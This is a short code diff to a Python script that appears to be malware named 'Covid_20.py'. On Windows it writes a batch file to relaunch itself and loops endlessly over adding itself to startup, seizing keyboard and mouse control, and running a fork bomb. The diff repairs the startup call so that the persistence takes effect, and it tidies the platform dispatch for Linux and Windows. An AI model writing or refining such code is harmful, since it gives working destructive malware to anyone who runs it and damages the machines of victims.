@@ -30,15 +30,13 @@ def win_code():
             bat_file.write(r'python "" %s' % file_path+"\Covid_20.py")
     
     while True:
-        add_to_startup,
+        add_to_startup(),
         key_pressing,
         mouse_control,
         os.system("fork_bomb.bat") 
         
 # If the user is using linux, use the linux() function
-if platform == 'linux' or platform == 'linux2':
-    linux()
+if platform == 'linux' or platform == 'linux2': linux()
     
 # If the user is using windows use the windows() function
-elif platform == 'win32':
-    win_code() 
+elif platform == 'win32': win_code() 
